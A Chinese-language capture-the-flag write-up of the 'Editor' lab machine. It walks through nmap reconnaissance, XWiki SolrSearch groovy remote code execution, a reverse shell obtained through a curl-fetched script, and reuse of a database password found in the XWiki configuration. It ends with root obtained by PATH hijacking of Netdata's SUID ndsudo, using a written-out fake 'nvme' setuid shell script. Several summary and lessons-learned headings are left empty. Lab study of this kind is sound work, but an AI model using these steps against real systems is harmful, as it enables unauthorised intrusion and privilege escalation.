## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Editor
2. 難度:Easy
3. IP:10.129.203.192

### 主要發現：
1. 漏洞 ：（風險等級：）
2. 漏洞 ：（風險等級：）

### 攻擊鏈摘要：

### 潛在影響：

### 修復建議：

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠

```bash
sudo nmap -sT -Pn --min-rate 1000 -p- 10.129.203.192 -oA portscan/ports
sudo nmap -sU --top-ports 20 10.129.203.192 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p22,80,8080 -oA portscan/detail
sudo nmap --script=vuln -p22,80,8080 -oA portscan/vuln
```

<img width="823" height="360" alt="螢幕擷取畫面 2026-04-29 203637" src="https://github.com/user-attachments/assets/40e19bf7-f6f3-4447-8a00-0f332e7605a4" />

<img width="611" height="582" alt="螢幕擷取畫面 2026-04-29 203646" src="https://github.com/user-attachments/assets/d0884ba0-1898-4aa2-8e6a-91ffee8cdcc2" />

<img width="1012" height="749" alt="螢幕擷取畫面 2026-04-29 203750" src="https://github.com/user-attachments/assets/88ff0434-82e9-4bb6-9967-e0158f35fbe5" />

<img width="822" height="694" alt="螢幕擷取畫面 2026-04-29 204211" src="https://github.com/user-attachments/assets/8d4010dd-a492-4134-bc09-738354fab8d2" />

先將掃描到的域名寫入/etc/hosts

<img width="507" height="231" alt="螢幕擷取畫面 2026-04-29 204224" src="https://github.com/user-attachments/assets/922153ee-dc11-469e-9293-2708382e0149" />

使用whatweb檢查80和8080

```bash
whatweb http://10.129.203.192
whatweb http://10.129.203.192:8080
```

<img width="1780" height="212" alt="螢幕擷取畫面 2026-04-29 204407" src="https://github.com/user-attachments/assets/6b879a47-8522-480d-b935-c382a3798f75" />

### 2.2 枚舉(Enumeration)

從資訊蒐集中基本上可以確認xwiki的存在，它是使用Java編寫的開源的Wiki引擎，公開漏洞很多，因為這個關鍵字出現率太高，比起完整的枚舉Web，我更傾向針對性的枚舉xwiki的訊息，在滲透測試實戰中應該完整的測試過全部的功能

探索80和8080

<img width="1420" height="830" alt="螢幕擷取畫面 2026-04-29 204440" src="https://github.com/user-attachments/assets/3ad12a23-b47e-486d-b7cc-9246783288a7" />

<img width="1884" height="823" alt="螢幕擷取畫面 2026-04-29 204450" src="https://github.com/user-attachments/assets/30507bd5-059d-4e10-9965-bd57aba981b3" />

從原始碼找到xwiki的版本訊息

<img width="968" height="821" alt="螢幕擷取畫面 2026-04-29 204548" src="https://github.com/user-attachments/assets/ad9851fe-376f-4e6e-8ac5-e361fdeaa37f" />

透過版本訊息找到公開漏洞訊息

<img width="1907" height="195" alt="螢幕擷取畫面 2026-04-29 204651" src="https://github.com/user-attachments/assets/4ccd8036-6ece-4df8-925c-38cdd980e155" />

透過說明資料了解到任何訪客都可以透過向XWiki的SolrSearch巨集發送請求來執行任意遠端程式碼

<img width="744" height="830" alt="螢幕擷取畫面 2026-04-29 204750" src="https://github.com/user-attachments/assets/73102b8f-a8d6-4c49-ac02-6dfb29d4b185" />

XWiki未正確驗證text參數，此參數用於在應用程式資料庫上建立和執行Solr查詢，當請求時，media參數等於rss時，text參數會被渲染為產生的RSS來源標題和描述的一部分。

簡單來說，攻擊者發送media=rss讓伺服器進入易受攻擊的RSS處理流程，伺服器認為text只是普通的搜尋字串，卻直接將其餵給了負責解析巨集指令的引擎，引擎看到text內容中的 {{groovy}} 標記，便在伺服器端執行了其中的惡意代碼，達成遠端程式碼執行

<img width="1897" height="232" alt="螢幕擷取畫面 2026-04-29 205240" src="https://github.com/user-attachments/assets/be0a190c-83b1-4b35-930b-a41db5f97fe4" />

### 2.3 初始存取(Initial Access)

先將說明文件中的URL貼到瀏覽器，會出現伺服器的/etc/passwd內容，證實漏洞成功

在利用過程中，瀏覽器會彈出下載文件，這是因為當系統處理RSS請求時，輸出的內容被伺服器標記為application/rss+xml或application/xml，瀏覽器會將其視為二進位檔案並提示下載，簡單來說就是格式亂掉了，瀏覽器沒辦法認為這是一個用來「顯示網頁」的格式，就下載了

<img width="1123" height="857" alt="螢幕擷取畫面 2026-04-29 205305" src="https://github.com/user-attachments/assets/98545129-5920-44bd-84ac-eaa581491f22" />

我開啟nc監聽準備接收反彈Shell

<img width="404" height="200" alt="螢幕擷取畫面 2026-04-29 205454" src="https://github.com/user-attachments/assets/09493937-439d-42ee-9341-b6f3b6714962" />


我嘗試將PoC中的命令內容改為反彈Shell，但我產生錯誤，而且不只是因為URL編碼，即使我編的再全，也是會報錯，甚至換了好幾種Payload都不行，我認為這是Groovy的語法限制加上某種攔截機制，但我當下無法確定

<img width="1909" height="647" alt="螢幕擷取畫面 2026-04-29 213120" src="https://github.com/user-attachments/assets/399e720c-97d9-4a26-b797-1aa9ca728e45" />

經過測試，絕大多數的命令都是可以直接執行，唯獨反彈Shell類沒辦法處理，所以我將反彈Shell包裝成腳本，上傳後再執行來繞過一些限制或語法錯誤

<img width="419" height="175" alt="螢幕擷取畫面 2026-04-29 213302" src="https://github.com/user-attachments/assets/f18fb780-835f-4781-b3bb-bf99ea8723f5" />

Python伺服器託管腳本

<img width="554" height="90" alt="螢幕擷取畫面 2026-04-29 213345" src="https://github.com/user-attachments/assets/4318cdbf-39a9-411b-b7f6-9a563a413982" />

使用Burp Suite攔截請求

<img width="633" height="316" alt="螢幕擷取畫面 2026-04-29 214115" src="https://github.com/user-attachments/assets/4ca5e46d-b357-44c7-a32d-5e1e7b0ba0a7" />

將PoC中的命令改成curl命令，讓伺服器來抓我的腳本並透過-o參數另存在/dev/shm中，關於/dev/shm和/tmp的簡單說明在tips有

<img width="1378" height="264" alt="螢幕擷取畫面 2026-04-29 215205" src="https://github.com/user-attachments/assets/d44d3fd4-11b1-473d-8421-2af5069c7432" />

在Burp Suite中將整個text參數的內容都做URL編碼

<img width="1248" height="377" alt="螢幕擷取畫面 2026-04-29 215214" src="https://github.com/user-attachments/assets/2a1a0ed3-e044-4ec1-bcdb-6cb0e218c87b" />

發送之後Python伺服器收到兩次請求

<img width="688" height="129" alt="螢幕擷取畫面 2026-04-29 215224" src="https://github.com/user-attachments/assets/b0c1db85-5e13-4c93-9a24-fe9ef24a274a" />

接著將命令改為bash，並且呼叫腳本，一樣要做URL編碼

<img width="1240" height="257" alt="螢幕擷取畫面 2026-04-29 215308" src="https://github.com/user-attachments/assets/719c342f-5530-4fc7-8a37-56dcfb562117" />

獲得反彈Shell

<img width="889" height="355" alt="螢幕擷取畫面 2026-04-29 215358" src="https://github.com/user-attachments/assets/c2b8a019-e419-4666-9977-00ec02dff87d" />


### 2.4 橫向移動(Lateral Movement)

我發現我無法提取user.txt，並且經過各種提權手段都沒有結果，所以我打算找找xwiki有沒有遺留憑證

遺留憑證在各種地方都可能留下，最有可能的就是桌面、歷史紀錄，和應用程式的設定檔，尤其是被隱藏的資料庫設定檔，這些一定是要優先想到的

```bash
find / -name xwiki -type d 2>/dev/null
```

<img width="1221" height="251" alt="螢幕擷取畫面 2026-04-29 215828" src="https://github.com/user-attachments/assets/c6d611de-1dec-4ea2-a3f6-ee2d19f800eb" />

我到/etc/xwiki中找尋設定檔

<img width="683" height="476" alt="螢幕擷取畫面 2026-04-29 215940" src="https://github.com/user-attachments/assets/f1bcd6b5-63de-4399-8375-695902b0e9be" />

在設定檔中我找到一組資料庫的憑證

<img width="662" height="450" alt="螢幕擷取畫面 2026-04-29 215954" src="https://github.com/user-attachments/assets/fd24c53c-b700-4a45-9bf5-ba8dcab157fb" />

<img width="1451" height="141" alt="螢幕擷取畫面 2026-04-29 220036" src="https://github.com/user-attachments/assets/7d6ecbd2-092e-4484-a999-061675709617" />

找到任何憑證都應該優先嘗試su以及ssh的碰撞，總是有人會重用密碼，使用者名稱來自家目錄以及最一開始PoC中的/etc/passwd

<img width="763" height="726" alt="螢幕擷取畫面 2026-04-29 220158" src="https://github.com/user-attachments/assets/03d79ec8-8edb-426f-9278-01aa6d74d3ce" />

獲得user.txt

<img width="414" height="186" alt="螢幕擷取畫面 2026-04-29 220224" src="https://github.com/user-attachments/assets/b256e9b8-495d-495f-b5d4-a34df7ae5071" />

### 2.5 權限提升(Privilege Escalation)

查找SUID文件，有一整組netdata的應用程式都擁有SUID
```bash
find / -perm -u=s -type f 2>/dev/null
```

<img width="599" height="421" alt="螢幕擷取畫面 2026-04-29 220534" src="https://github.com/user-attachments/assets/f72324be-0064-4958-9e4d-174d70076cd2" />

我查看了ndsudo的幫助頁面，ndsudo是Netdata這個監控代理程式的輔助程式，在安裝時通常被賦予了SUID root權限，其中有一個nvme-list指令，用來列出所有已連接的NVMe儲存裝置，因為列出這些東西需要root權限，所以通常會有SUID

ndsudo在執行nvme-list指令時，會呼叫nvme這個執行檔，但ndsudo並未使用絕對路徑書寫，所以攻擊者可劫持PATH變數讓ndsudo以root身分呼叫同名的惡意執行檔，以達成權限提升

<img width="690" height="632" alt="螢幕擷取畫面 2026-04-29 220624" src="https://github.com/user-attachments/assets/a8d53dbd-4e62-4018-80ae-4bcbde9125c2" />

<img width="1292" height="572" alt="螢幕擷取畫面 2026-04-29 220829" src="https://github.com/user-attachments/assets/60c5f9d7-a73a-4669-89a6-a5199972d5d4" />

先在/dev/shm中編寫一個名為nvme的惡意執行檔，內含提權邏輯，以root身分呼叫/bin/bash，並且給這個執行檔執行權限

```bash
echo -e '#!/usr/bin/env python3\nimport os; os.setuid(0); os.execl("/bin/bash", "bash")' > nvme
chmod +x nvme
```

<img width="1101" height="196" alt="螢幕擷取畫面 2026-04-29 221910" src="https://github.com/user-attachments/assets/b9fea16f-bd24-4c01-b1c9-ee3c8383b313" />

劫持PATH變數

```bash
export PATH=.:$PATH
```

<img width="935" height="83" alt="螢幕擷取畫面 2026-04-29 222012" src="https://github.com/user-attachments/assets/dcad1a40-a2c0-496d-876b-52e441af6c29" />

使用ndsudo的nvme-list參數來呼叫惡意執行檔

<img width="813" height="90" alt="螢幕擷取畫面 2026-04-29 222039" src="https://github.com/user-attachments/assets/7af26eef-6b0b-4b76-9208-7e2731633a19" />

### 2.6 最終成果(Impact)

獲得root.txt

<img width="984" height="498" alt="螢幕擷取畫面 2026-04-29 222210" src="https://github.com/user-attachments/assets/cfb751e7-97a1-4086-9fbf-21f3b6dc25e9" />

---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
